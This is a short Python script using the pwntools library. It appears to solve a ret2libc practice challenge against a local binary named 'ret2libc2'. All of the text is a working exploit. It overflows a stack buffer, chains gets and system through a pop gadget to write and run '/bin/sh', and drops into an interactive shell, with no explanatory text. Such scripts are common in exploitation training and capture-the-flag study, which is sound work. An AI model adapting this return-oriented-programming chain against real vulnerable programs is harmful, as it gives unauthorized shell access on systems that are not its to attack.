from pwn import *

sh = process('./rop/ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
offset=0x6c+4



payload = b'A' * offset+p32(gets_plt)+p32(pop_ebx)+p32(buf2)+p32(system_plt)+p32(0xcccccccc)+p32(buf2)

sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
